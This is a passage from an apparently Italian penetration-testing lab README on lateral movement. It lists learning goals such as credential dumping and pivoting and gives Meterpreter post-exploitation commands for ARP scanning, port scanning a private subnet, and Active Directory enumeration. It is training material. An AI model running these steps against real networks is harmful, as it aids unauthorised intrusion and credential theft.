
## 📄 FILE 7: scenarios/lateral-movement/README.md

```markdown
# 🔄 Scenario: Movimento Laterale

## 📖 Panoramica Scenario

**Difficoltà**: 🟡 Intermedio  
**Tempo Stimato**: 60-90 minuti  
**Obiettivi**: Muoversi attraverso la rete verso sistemi target

### 🎯 Obiettivi di Apprendimento
- Enumerazione rete interna
- Credential dumping e riuso
- Pivoting tra subnet
- Accesso a sistemi aggiuntivi

## 🛠️ Prerequisiti

- ✅ Sessione Meterpreter attiva su host iniziale
- ✅ Ambiente di dominio configurato
- ✅ Multiple macchine nella rete
- ✅ Credenziali di dominio disponibili

## 📋 Fasi dello Scenario

### Fase 1: Enumerazione Rete Interna
```bash
# Scoperta host nella rete
meterpreter > run post/windows/gather/arp_scanner RHOSTS=192.168.100.0/24

# Scansione porte su host scoperti
meterpreter > run post/multi/gather/portscan/tcp RHOSTS=192.168.100.0/24 PORTS=135,139,445,3389

# Enumerazione Active Directory (se in dominio)
meterpreter > run post/windows/gather/enum_domain
